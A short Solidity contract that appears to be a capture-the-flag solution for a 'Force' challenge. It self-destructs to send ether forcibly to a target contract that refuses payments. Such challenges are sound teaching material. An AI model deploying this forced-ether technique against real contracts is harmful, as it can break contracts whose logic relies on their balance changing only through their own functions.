// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceSolution {
    address payable public force;

    constructor(address forceAddress) {
        force = payable(forceAddress);
    }

    function solveChallenge() public payable {
        selfdestruct(force);
    }
}
